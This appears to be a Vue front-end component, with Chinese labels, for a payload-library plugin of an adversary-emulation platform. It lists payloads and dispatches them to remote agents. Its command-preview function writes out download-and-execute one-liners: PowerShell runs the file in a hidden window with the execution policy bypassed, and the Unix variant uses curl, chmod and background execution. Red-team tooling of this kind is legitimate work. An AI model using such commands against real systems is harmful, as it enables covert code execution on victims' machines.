<script setup>
import { inject, reactive, ref, onMounted } from 'vue';

const $api = inject('$api');

const state = reactive({
  search: '',
  filters: { tactics: [], os: [], file_types: [], tags: [], status: [], severity: [] },
  sort: 'updated_at:desc',
  page: 1, page_size: 20,
  items: [], total: 0,
  facets: { tactics:[], os:[], file_types:[], tags:[], status:[], severity:[] },
  selected: new Set(),
  detail: null,
  showDetail: false,
  showRun: false,
  runId: null,
  agents: { items: [], total: 0, page: 1, page_size: 20, search: '', online_only: false },
  dispatchResult: null,
  historyOpen: false,
  historyItems: [],
});

function buildListURL(){
  const u = new URL('/plugin/payloads', window.location.origin);
  u.searchParams.set('search', state.search||'');
  u.searchParams.set('page', state.page);
  u.searchParams.set('page_size', state.page_size);
  u.searchParams.set('sort', state.sort);
  for(const k of ['tactics','os','file_types','tags','status','severity']){
    (state.filters[k]||[]).forEach(v=>u.searchParams.append(k, v));
  }
  return u.toString();
}

async function loadList(){
  const { data } = await $api.get(buildListURL(), { withCredentials: true });
  state.items = data.items || []; state.total = data.total || 0;
}
async function loadFacets(){
  const { data } = await $api.get('/plugin/payloads/facets', { withCredentials: true });
  state.facets = data || state.facets;
}
async function search(){ state.page = 1; await Promise.all([loadList(), loadFacets()]); }
function toggleFilter(key, val){
  const arr = state.filters[key]||(state.filters[key]=[]);
  const i=arr.indexOf(val); if(i>=0) arr.splice(i,1); else arr.push(val); search();
}
function isSelected(key, val){ return (state.filters[key]||[]).includes(val); }
function onSelect(id, checked){ if(checked) state.selected.add(id); else state.selected.delete(id); }

async function importYaml(e){
  const f = e.target.files?.[0]; if(!f) return;
  const fd = new FormData(); fd.append('yaml_file', f);
  await $api.post('/plugin/payloads/import', fd, { withCredentials:true });
  await search(); e.target.value='';
}
const uploadInfo = ref(null);
async function uploadFile(e){
  const f = e.target.files?.[0]; if(!f) return;
  const fd = new FormData(); fd.append('file', f);
  const { data } = await $api.post('/plugin/payloads/upload-file', fd, { withCredentials:true });
  uploadInfo.value = data; e.target.value='';
}

async function exportYaml(){
  const u = new URL('/plugin/payloads/export', window.location.origin);
  u.searchParams.set('format','yaml');
  if(state.selected.size>0){ Array.from(state.selected).forEach(id=>u.searchParams.append('ids', id)); }
  else { u.searchParams.set('search', state.search||''); }
  window.location = u.toString();
}
async function exportCsv(){
  const u = new URL('/plugin/payloads/export', window.location.origin);
  u.searchParams.set('format','csv');
  if(state.selected.size>0){ Array.from(state.selected).forEach(id=>u.searchParams.append('ids', id)); }
  else { u.searchParams.set('search', state.search||''); }
  window.location = u.toString();
}

onMounted(async ()=>{ await search(); });

async function openDetail(id){
  const { data } = await $api.get(`/plugin/payloads/${encodeURIComponent(id)}`, { withCredentials:true });
  state.detail = data; state.showDetail = true;
}
function closeDetail(){ state.showDetail = false; state.detail = null; }

async function openRun(id){
  state.runId = id; state.showRun = true; await loadAgents();
}
function closeRun(){ state.showRun = false; state.runId = null; state.dispatchResult = null; }

async function loadAgents(){
  const p = { search: state.agents.search||'', online_only: state.agents.online_only ? 'true':'false', page: state.agents.page, page_size: state.agents.page_size };
  const { data } = await $api.get(`/plugin/payloads/agents?${new URLSearchParams(p).toString()}`, { withCredentials:true });
  state.agents.items = data.items || []; state.agents.total = data.total || 0;
}

function toggleAgentSelection(paw){
  const el = document.getElementById(`agent-${paw}`);
  if(el) el.checked = !el.checked;
}

function buildPreviewCommand(item){
  const pid = item.id; const file_type = (item.file_type||'').toLowerCase();
  const base = window.location.origin.replace(/\/$/, '');
  const download = `${base}/plugin/payloads/${encodeURIComponent(pid)}/download`;
  if((item.os||[]).includes('windows')){
    let out = `$p=$env:TEMP+'\\\\${pid}';`;
    out += `Invoke-WebRequest -UseBasicParsing -Uri '${download}' -OutFile $p;`;
    if(file_type==='exe') out += 'Start-Process -FilePath $p -WindowStyle Hidden;';
    else if(file_type==='ps1') out += 'powershell -ExecutionPolicy Bypass -File $p;';
    else if(file_type==='py') out += 'python $p;';
    else out += "Write-Host 'Downloaded payload';";
    return out;
  }
  let out = `p=/tmp/${pid}; curl -fsSL '${download}' -o $p; chmod +x $p; `;
  if(file_type==='sh') out += 'bash $p;';
  else if(file_type==='py') out += 'python3 $p;';
  else out += '$p &';
  return out;
}

async function doDispatch(){
  const agent_ids = [];
  document.querySelectorAll('#agents-list input[type=checkbox]').forEach(cb=>{ if(cb.checked) agent_ids.push(cb.value); });
  if(agent_ids.length===0){ alert('请选择至少一个代理'); return; }
  const body = { id: state.runId, args: {}, targets: { agent_ids }, mode: 'dispatch_to_agents' };
  const { data } = await $api.post('/plugin/payloads/dispatch', body, { withCredentials:true });
  state.dispatchResult = data;
}

async function batch(action){
  const ids = Array.from(state.selected);
  if(ids.length===0){ alert('请选择条目'); return; }
  if(action==='dispatch'){
    // 选择代理并执行批量下发：复用下发弹窗
    state.runId = null; state.showRun = true; await loadAgents();
    // 在用户确认后，读取已选择代理并调用批量接口
    const confirmFn = async ()=>{
      const agent_ids = [];
      document.querySelectorAll('#agents-list input[type=checkbox]').forEach(cb=>{ if(cb.checked) agent_ids.push(cb.value); });
      if(agent_ids.length===0){ alert('请选择至少一个代理'); return; }
      const body = { action:'dispatch', ids, targets:{ agent_ids }, mode:'dispatch_to_agents' };
      const { data } = await $api.post('/plugin/payloads/batch', body, { withCredentials:true });
      alert('批量下发完成'); state.showRun=false; await loadList();
    };
    // 重绑定确认按钮
    setTimeout(()=>{
      const btn = document.querySelector('#confirm-dispatch-batch');
      if(btn){ btn.onclick = confirmFn; }
    }, 0);
    return;
  }
  const { data } = await $api.post('/plugin/payloads/batch', { action, ids }, { withCredentials:true });
  await loadList();
}

function headerSort(field){
  const [curField, curDir] = state.sort.split(':');
  if(curField === field){
    state.sort = `${field}:${curDir==='asc'?'desc':'asc'}`;
  } else {
    state.sort = `${field}:asc`;
  }
  search();
}

async function loadHistory(){
  const { data } = await $api.get('/plugin/payloads/history', { withCredentials:true });
  state.historyItems = data.items || [];
}
function toggleHistory(){ state.historyOpen = !state.historyOpen; if(state.historyOpen) loadHistory(); }
function gotoOperation(op){ window.location.href = '/#/operations'; }

// 列显隐设置持久化
const visible = reactive({ name:true, os:true, file_type:true, tactics:true, md5:true, severity:true, updated_at:true });
function loadColumnPrefs(){ try{ const raw = localStorage.getItem('payloads.columns'); if(raw){ const obj = JSON.parse(raw); Object.assign(visible, obj); } } catch(e){} }
function saveColumnPrefs(){ localStorage.setItem('payloads.columns', JSON.stringify(visible)); }
loadColumnPrefs();
</script>

<template>
  <div class="content">
    <h2>Payload Library</h2>
    <div class="columns mb-3">
      <div class="column is-two-thirds">
        <div class="field has-addons">
          <div class="control is-expanded">
            <input class="input" placeholder="搜索名称/描述/标签..." v-model="state.search" @keyup.enter="search" />
          </div>
          <div class="control">
            <button class="button is-primary" @click="search">查询</button>
          </div>
          <div class="control">
            <button class="button" @click="exportYaml">导出YAML</button>
          </div>
          <div class="control">
            <button class="button" @click="exportCsv">导出CSV</button>
          </div>
        </div>
      </div>
      <div class="column">
        <div class="buttons is-right">
          <div class="file is-small is-info">
            <label class="file-label">
              <input class="file-input" type="file" accept=".yml,.yaml" @change="importYaml" />
              <span class="file-cta"><span class="file-label">导入YAML</span></span>
            </label>
          </div>
          <div class="file is-small">
            <label class="file-label">
              <input class="file-input" type="file" @change="uploadFile" />
              <span class="file-cta"><span class="file-label">上传文件</span></span>
            </label>
          </div>
        </div>
        <p v-if="uploadInfo" class="is-size-7">已上传: {{ uploadInfo.source_path }} (md5 {{ uploadInfo.md5 }})</p>
      </div>
    </div>

    <div class="is-pulled-right mb-3">
      <button class="button is-small" @click="toggleHistory">下发历史</button>
    </div>

    <div class="columns">
      <div class="column is-one-quarter">
        <aside class="menu">
          <p class="menu-label">筛选</p>
          <p class="menu-label">战术</p>
          <div class="buttons are-small">
            <button v-for="f in state.facets.tactics" :key="f.key" class="button is-light is-small" :class="{ 'is-info': isSelected('tactics', f.key) }" @click="toggleFilter('tactics', f.key)">
              {{ f.key }} ({{ f.count }})
            </button>
          </div>
          <p class="menu-label">系统</p>
          <div class="buttons are-small">
            <button v-for="f in state.facets.os" :key="f.key" class="button is-light is-small" :class="{ 'is-info': isSelected('os', f.key) }" @click="toggleFilter('os', f.key)">
              {{ f.key }} ({{ f.count }})
            </button>
          </div>
          <p class="menu-label">类型</p>
          <div class="buttons are-small">
            <button v-for="f in state.facets.file_types" :key="f.key" class="button is-light is-small" :class="{ 'is-info': isSelected('file_types', f.key) }" @click="toggleFilter('file_types', f.key)">
              {{ f.key }} ({{ f.count }})
            </button>
          </div>
          <p class="menu-label">标签</p>
          <div class="buttons are-small">
            <button v-for="f in state.facets.tags" :key="f.key" class="button is-light is-small" :class="{ 'is-info': isSelected('tags', f.key) }" @click="toggleFilter('tags', f.key)">
              {{ f.key }} ({{ f.count }})
            </button>
          </div>
          <p class="menu-label">状态</p>
          <div class="buttons are-small">
            <button v-for="f in state.facets.status" :key="f.key" class="button is-light is-small" :class="{ 'is-info': isSelected('status', f.key) }" @click="toggleFilter('status', f.key)">
              {{ f.key }} ({{ f.count }})
            </button>
          </div>
          <p class="menu-label">严重程度</p>
          <div class="buttons are-small">
            <button v-for="f in state.facets.severity" :key="f.key" class="button is-light is-small" :class="{ 'is-info': isSelected('severity', f.key) }" @click="toggleFilter('severity', f.key)">
              {{ f.key }} ({{ f.count }})
            </button>
          </div>
        </aside>
      </div>
      <div class="column">
        <div class="is-flex is-justify-content-space-between is-align-items-center mb-2">
          <div>
            <button class="button is-small" @click="batch('dispatch')" :disabled="state.selected.size===0">批量下发</button>
            <button class="button is-small" @click="batch('enable')" :disabled="state.selected.size===0">批量启用</button>
            <button class="button is-small" @click="batch('disable')" :disabled="state.selected.size===0">批量禁用</button>
            <button class="button is-small is-danger" @click="batch('delete')" :disabled="state.selected.size===0">批量删除</button>
          </div>
          <div class="field is-grouped">
            <div class="control">
              <div class="dropdown is-right" :class="{ 'is-active': showCols }">
                <div class="dropdown-trigger">
                  <button class="button is-small" @click="showCols=!showCols">列显示</button>
                </div>
                <div class="dropdown-menu" role="menu">
                  <div class="dropdown-content p-2">
                    <label class="checkbox is-block"><input type="checkbox" v-model="visible.name" @change="saveColumnPrefs"/> 名称/ID</label>
                    <label class="checkbox is-block"><input type="checkbox" v-model="visible.os" @change="saveColumnPrefs"/> OS</label>
                    <label class="checkbox is-block"><input type="checkbox" v-model="visible.file_type" @change="saveColumnPrefs"/> 类型</label>
                    <label class="checkbox is-block"><input type="checkbox" v-model="visible.tactics" @change="saveColumnPrefs"/> 战术</label>
                    <label class="checkbox is-block"><input type="checkbox" v-model="visible.md5" @change="saveColumnPrefs"/> MD5</label>
                    <label class="checkbox is-block"><input type="checkbox" v-model="visible.severity" @change="saveColumnPrefs"/> 严重度</label>
                    <label class="checkbox is-block"><input type="checkbox" v-model="visible.updated_at" @change="saveColumnPrefs"/> 更新时间</label>
                  </div>
                </div>
              </div>
            </div>
            <p class="control"><span class="is-size-7">每页</span></p>
            <p class="control">
              <div class="select is-small">
                <select v-model.number="state.page_size" @change="search">
                  <option :value="20">20</option>
                  <option :value="50">50</option>
                  <option :value="100">100</option>
                </select>
              </div>
            </p>
          </div>
        </div>
        <table class="table is-striped is-fullwidth is-narrow">
          <thead>
            <tr>
              <th></th>
              <th v-if="visible.name"><a @click.prevent="headerSort('name')">名称/ID</a></th>
              <th v-if="visible.os">OS</th>
              <th v-if="visible.file_type"><a @click.prevent="headerSort('file_type')">类型</a></th>
              <th v-if="visible.tactics">战术</th>
              <th v-if="visible.md5">MD5</th>
              <th v-if="visible.severity"><a @click.prevent="headerSort('severity')">严重度</a></th>
              <th v-if="visible.updated_at"><a @click.prevent="headerSort('updated_at')">更新时间</a></th>
              <th>操作</th>
            </tr>
          </thead>
          <tbody>
            <tr v-for="it in state.items" :key="it.id">
              <td><input type="checkbox" :checked="state.selected.has(it.id)" @change="onSelect(it.id, $event.target.checked)" /></td>
              <td v-if="visible.name">
                <strong>{{ it.name }}</strong>
                <div class="is-size-7 has-text-grey">{{ it.id }}</div>
              </td>
              <td v-if="visible.os">{{ (it.os||[]).join(',') }}</td>
              <td v-if="visible.file_type">{{ it.file_type }}</td>
              <td v-if="visible.tactics">
                <span v-for="t in (it.tactics||[])" :key="t" class="tag is-dark is-rounded mr-1">{{ t }}</span>
              </td>
              <td v-if="visible.md5" class="is-family-monospace is-size-7">{{ it.md5 }}</td>
              <td v-if="visible.severity">{{ it.severity || '-' }}</td>
              <td v-if="visible.updated_at" class="is-size-7">{{ it.updated_at || '-' }}</td>
              <td class="is-nowrap">
                <div class="buttons are-small">
                  <button class="button is-light" @click="openDetail(it.id)">详情</button>
                  <a class="button is-link is-light" :href="`/plugin/payloads/${encodeURIComponent(it.id)}/download`">下载</a>
                  <button class="button is-primary" @click="openRun(it.id)">下发</button>
                </div>
              </td>
            </tr>
          </tbody>
        </table>
        <nav class="pagination is-small is-right" role="navigation" aria-label="pagination">
          <a class="pagination-previous" @click.prevent="state.page=Math.max(1,state.page-1); loadList()">上一页</a>
          <a class="pagination-next" @click.prevent="state.page=Math.ceil(state.total/state.page_size)>state.page?state.page+1:state.page; loadList()">下一页</a>
          <ul class="pagination-list">
            <li><span class="pagination-ellipsis">第 {{ state.page }} / {{ Math.max(1, Math.ceil(state.total/state.page_size)) }} 页</span></li>
            <li><span class="pagination-ellipsis">共 {{ state.total }} 条</span></li>
          </ul>
        </nav>
      </div>
    </div>

    <!-- 详情弹窗 -->
    <div class="modal" :class="{ 'is-active': state.showDetail }">
      <div class="modal-background" @click="closeDetail"></div>
      <div class="modal-card" style="width: 800px;">
        <header class="modal-card-head">
          <p class="modal-card-title">载荷详情</p>
          <button class="delete" aria-label="close" @click="closeDetail"></button>
        </header>
        <section class="modal-card-body" v-if="state.detail">
          <div class="columns is-multiline">
            <div class="column is-half"><strong>名称</strong><div>{{ state.detail.name }}</div></div>
            <div class="column is-half"><strong>ID</strong><div class="is-family-monospace">{{ state.detail.id }}</div></div>
            <div class="column is-full"><strong>描述</strong><div>{{ state.detail.description }}</div></div>
            <div class="column is-half"><strong>MD5</strong><div class="is-family-monospace">{{ state.detail.md5 }}</div></div>
            <div class="column is-half"><strong>类型</strong><div>{{ state.detail.file_type }}</div></div>
            <div class="column is-half"><strong>系统</strong><div>{{ (state.detail.os||[]).join(', ') }}</div></div>
            <div class="column is-half"><strong>战术</strong><div><span v-for="t in (state.detail.tactics||[])" :key="t" class="tag is-dark is-rounded mr-1">{{ t }}</span></div></div>
          </div>
          <div v-if="state.detail">
            <p class="mb-2"><strong>命令预览（示例）</strong></p>
            <pre class="is-family-monospace" style="white-space: pre-wrap;">{{ buildPreviewCommand(state.detail) }}</pre>
            <button class="button is-small" @click="() => navigator.clipboard.writeText(buildPreviewCommand(state.detail))">复制命令</button>
          </div>
          <div v-if="state.detail && (state.detail.args||[]).length">
            <p class="mt-3"><strong>参数</strong></p>
            <table class="table is-fullwidth is-narrow">
              <thead><tr><th>参数</th><th>类型</th><th>必填</th><th>默认值</th><th>示例</th><th>描述</th></tr></thead>
              <tbody>
                <tr v-for="a in state.detail.args" :key="a.key">
                  <td class="is-family-monospace">{{ a.key }}</td>
                  <td>{{ a.type }}</td>
                  <td>{{ a.required ? '是' : '否' }}</td>
                  <td>{{ a.default ?? '-' }}</td>
                  <td>{{ a.example ?? '-' }}</td>
                  <td>{{ a.description ?? '-' }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </section>
        <footer class="modal-card-foot">
          <button class="button" @click="closeDetail">关闭</button>
        </footer>
      </div>
    </div>

    <!-- 下发对话框 -->
    <div class="modal" :class="{ 'is-active': state.showRun }">
      <div class="modal-background" @click="closeRun"></div>
      <div class="modal-card" style="width: 900px;">
        <header class="modal-card-head">
          <p class="modal-card-title">下发到代理</p>
          <button class="delete" aria-label="close" @click="closeRun"></button>
        </header>
        <section class="modal-card-body">
          <div class="field is-grouped">
            <p class="control is-expanded"><input class="input" placeholder="按主机/PAW 搜索" v-model="state.agents.search" @keyup.enter="loadAgents" /></p>
            <p class="control"><label class="checkbox"><input type="checkbox" v-model="state.agents.online_only" @change="loadAgents" /> 仅在线</label></p>
            <p class="control"><button class="button" @click="loadAgents">刷新</button></p>
          </div>
          <div id="agents-list" style="max-height: 300px; overflow: auto;" class="box">
            <table class="table is-fullwidth is-narrow">
              <thead><tr><th></th><th>主机</th><th>PAW</th><th>平台</th><th>执行器</th></tr></thead>
              <tbody>
                <tr v-for="a in state.agents.items" :key="a.paw" @click="toggleAgentSelection(a.paw)">
                  <td><input :id="`agent-${a.paw}`" type="checkbox" :value="a.paw" /></td>
                  <td>{{ a.host }}</td>
                  <td class="is-family-monospace">{{ a.paw }}</td>
                  <td>{{ a.platform }}</td>
                  <td>{{ (a.executors||[]).join(',') }}</td>
                </tr>
              </tbody>
            </table>
          </div>
          <div v-if="state.dispatchResult" class="notification is-success is-light">
            <p>操作已创建：{{ state.dispatchResult.operation_id }}</p>
          </div>
        </section>
        <footer class="modal-card-foot is-justify-content-flex-end">
          <button id="confirm-dispatch-batch" class="button is-primary" @click="doDispatch">确认下发</button>
          <button class="button" @click="closeRun">关闭</button>
        </footer>
      </div>
    </div>
  </div>
</template>

<style scoped>
.is-nowrap { white-space: nowrap; }
</style>

<style scoped>
</style>


